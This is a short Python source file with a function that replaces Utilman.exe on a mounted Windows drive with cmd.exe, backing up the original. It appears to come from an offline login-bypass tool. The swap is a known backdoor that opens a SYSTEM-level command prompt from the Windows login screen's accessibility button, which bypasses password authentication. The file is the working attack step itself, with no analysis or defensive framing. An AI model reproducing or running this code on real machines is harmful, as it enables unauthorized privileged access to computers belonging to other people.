import os


def utilman():
    os.system(
        'mv /mnt/targetDrive/Windows/System32/Utilman.exe /mnt/targetDrive/Windows/System32/Utilman.bak')
    os.system(
        'mv /mnt/targetDrive/Windows/System32/cmd.exe /mnt/targetDrive/Windows/System32/Utilman.exe')
